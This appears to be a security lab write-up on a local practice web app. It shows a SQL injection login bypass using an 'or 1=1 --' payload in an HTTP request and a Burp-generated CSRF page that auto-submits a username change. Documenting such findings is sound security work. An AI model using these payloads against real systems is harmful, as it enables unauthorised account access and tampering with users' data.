## SQL Injection

### Description

A SQL injection attack consists of the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database, recover the content of a given file present on the DBMS file system, and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands. The login page is vulnerable to SQL injection attacks using that an attacker can log in to the application without knowing the credentials.

### Steps

- Checked for a login field to input user commands.
Tried to check for a security misconfiguration by adding a ' Symbol.

```
POST /rest/user/login HTTP/1.1
...

{
"email":"'",
"password":"1"
}
```

Responded with an SQLite error and also the SQL tables and password hash.

- Checked for a simple SQL injection by trying to bypass the authentication process with 

```
POST /rest/user/login HTTP/1.1
Accept: application/json, text/plain, */*

{
 "email":"'or 1=1 --",
 "password":"1"
}
```

### PoC

we check for security misconfiguration

we bypass the login authentication process and are able to login as admin.

## CSRF in the update of the username

### Description
Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to submit a request to a Web application against which they are currently authenticated. CSRF attacks exploit the trust a Web application has in an authenticated user. 

### Steps 

An HTML page with this form will cause the user to automatically update his username

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1:3000/profile" method="POST">
      <input type="hidden" name="username" value="CSRFIsSerious" />
    </form>
		<script>document.forms[0].submit()</script>
  </body>
</html>
```

### PoC
### Mitigation
Implement CSRF token with random value
